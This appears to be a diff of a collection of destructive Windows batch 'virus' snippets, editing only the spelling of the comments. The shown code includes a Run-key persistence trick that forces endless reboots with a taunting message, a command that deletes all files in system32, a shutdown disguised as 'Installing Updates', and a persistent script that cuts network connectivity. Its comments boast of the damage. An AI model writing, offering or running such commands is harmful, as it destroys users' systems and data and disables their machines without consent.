@@ -43,7 +43,7 @@ echo @echo off>c:windowshartlell.bat
 echo break off>>c:windowshartlell.bat
 echo shutdown -r -t 11 -f>>c:windowshartlell.bat
 echo end>>c:windowshartlell.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f			   --------------------->shutdowns the pc,on rebot displays the below mssg and shutdowns again
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f			   --------------------->Shutdowns the pc,on reboot displays the below mssg and shutdowns again
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
 echo You Are Nailed, Buy A New Computer This Is Piece Of Shit.
 PAUSE
@@ -65,14 +65,14 @@ shutdown -s -t 100 c “Installing Updates”
 
 --------------------------------
 
-del c:\WINDOWS\system32\*.*/q                                                ---------------->delets system 32
+del c:\WINDOWS\system32\*.*/q                                                ---------------->deletes system 32
 
 --------------------------------
 echo @echo off>c:windowswimn32.bat
 echo break off>>c:windowswimn32.bat
 echo ipconfig/release_all>>c:windowswimn32.bat
 echo end>>c:windowswimn32.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f  			                    ----------->won't connect internet after this code
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f  			         ----------->PC won't connect the internet again after running this code
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
 echo  Sorry baby! you lost your fucking internet
 PAUSE
